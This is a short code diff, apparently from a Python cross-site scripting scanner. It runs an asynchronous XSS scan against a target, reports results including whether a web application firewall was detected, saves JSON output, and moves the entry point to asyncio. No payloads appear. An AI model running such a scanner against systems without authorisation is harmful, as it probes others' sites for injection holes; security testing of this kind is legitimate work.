+        tester = XSSTester(session, target)
+        await tester.scan()
+
+        reporter = Reporter(tester.results, target, tester.waf_detected)
+        reporter.print_report()
+
+        if args.json:
+            reporter.save_json(args.json)
+        elif tester.results:
+            reporter.save_json("xss_report.json")
 
 if __name__ == "__main__":
-    try:
-        main()
-    except KeyboardInterrupt:
-        sys.exit(0)
+    if sys.platform == "win32":
+        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
+    asyncio.run(main())
